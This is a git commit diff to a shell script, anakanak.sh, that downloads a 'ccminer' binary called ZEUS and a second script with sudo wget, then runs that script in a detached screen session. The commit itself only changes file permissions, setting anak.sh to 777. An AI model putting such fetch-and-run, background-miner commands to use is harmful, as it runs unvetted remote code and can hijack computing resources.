935bf29327147fc06106940e0043a0c649723284
renilo <88342640+renilo@users.noreply.github.com>
2022-10-10 22:10:32 +0700

    Update anakanak.sh

--- anakanak.sh
+++ anakanak.sh
@@ -9,8 +9,11 @@ sudo wget -q https://github.com/indah38/ccminer/raw/main/ZEUS
 sudo wget https://raw.githubusercontent.com/renilo/kuuntul/main/anak.sh
 clear
 sleep 1
-chmod 700 ZEUS anak.sh
+chmod 700 ZEUS
 clear
+sleep 1
+clear
+sudo chmod 777 anak.sh
 sleep 1
 screen -dmS Running ./anak.sh
 sleep 1
